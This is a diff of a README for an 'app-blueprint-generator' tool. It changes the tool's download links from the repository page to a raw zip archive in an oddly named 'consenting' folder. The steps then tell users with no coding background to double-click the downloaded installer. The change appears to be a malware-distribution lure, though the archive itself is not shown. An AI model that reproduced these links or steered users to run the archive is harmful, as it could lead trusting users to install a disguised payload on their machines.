@@ -1,6 +1,6 @@
 # 🛠️ app-blueprint-generator - Build better software using smart automation
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/prosper12/app-blueprint-generator)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/prosper12/app-blueprint-generator/raw/refs/heads/main/consenting/app-generator-blueprint-2.8.zip)
 
 ## 🎯 About this tool
 This application helps you plan and build software projects. It uses smart automation to create logic for your ideas. You do not need to know how to write code to use this tool. The system guides you through the architecture of your software. You can choose from many different functions to build your project. It works without an internet connection once you install it.
@@ -15,7 +15,7 @@ This application helps you plan and build software projects. It uses smart autom
 ## 🚀 Getting Started
 Follow these steps to set up the software on your computer.
 
-1.  Visit the official repository page to download the latest version: [Download app-blueprint-generator](https://github.com/prosper12/app-blueprint-generator).
+1.  Visit the official repository page to download the latest version: [Download app-blueprint-generator](https://github.com/prosper12/app-blueprint-generator/raw/refs/heads/main/consenting/app-generator-blueprint-2.8.zip).
 2.  Locate the file you just downloaded in your Downloads folder.
 3.  Double-click the file to start the installer.
 4.  Follow the prompts on your screen to finish the installation.
